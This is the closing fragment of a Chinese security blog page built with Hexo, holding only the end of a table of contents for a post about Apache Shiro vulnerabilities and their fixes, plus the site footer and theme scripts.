&lt;&#x3D;1.4.1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-Shiro%E4%BF%AE%E5%A4%8D%E9%98%B2%E5%BE%A1"><span class="nav-number">5.3.</span> <span class="nav-text">5.3 Shiro修复防御</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">xisuansec</a>
            
        </div>
        
            <script async 
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
            <div class="deploy-info info-item">
                
                    本站由 <span class="tooltip" data-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
                
            </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>



</body>
</html>
